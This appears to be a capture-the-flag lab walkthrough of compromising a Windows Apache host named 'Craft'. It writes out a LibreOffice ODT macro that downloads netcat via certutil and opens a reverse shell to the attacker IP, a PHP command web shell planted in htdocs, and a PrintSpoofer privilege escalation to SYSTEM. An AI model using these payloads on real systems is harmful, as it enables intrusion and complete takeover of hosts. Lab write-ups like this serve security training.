```
nmap -sC -sV -Pn -p- 192.168.172.169
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-21 11:19 CDT
Nmap scan report for 192.168.172.169
Host is up (0.044s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
|_http-title: Craft

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 120.93 seconds

```

Located an upload on the website and when uploading it informed us to use the ODT format. Looking this up, I was able to find a way to add a Macro.

Added this after main:

```
Shell("certutil.exe -urlcache -split -f 'http://192.168.45.216:443/nc64.exe' 'C:\Windows\Temp\nc.exe'")
Shell("C:\Windows\Temp\nc.exe -e cmd.exe 192.168.45.216 80")
```

I then visited Tools > Customize > Events > Open Document and setup the Macro and saved.

I then uploaded the shell on the website and setup a listener and got a reverse shell.

```
C:\xampp>icacls htdocs
icacls htdocs
htdocs CRAFT\apache:(OI)(CI)(F)
       CRAFT\apache:(I)(OI)(CI)(F)
       NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
       BUILTIN\Administrators:(I)(OI)(CI)(F)
       BUILTIN\Users:(I)(OI)(CI)(RX)
       BUILTIN\Users:(I)(CI)(AD)
       BUILTIN\Users:(I)(CI)(WD)
       CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```

I saw a folder for an apache user. These users generally have more permissions so I uploaded a command php file into the htdocs to get control.

```
http://192.168.172.169/test.php?cmd=whoami%20/priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeTcbPrivilege                Act as part of the operating system       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

I see this user is exactly what I need. I used a powershell reverse shell to get access to setup a Priv Esc to System.

I utilized PrintSpoofer.exe and netcat to get a reverse shell back.

```
.\PrintSpoofer64.exe -c "nc.exe 192.168.45.216 4443 -e cmd"
```

I now had system.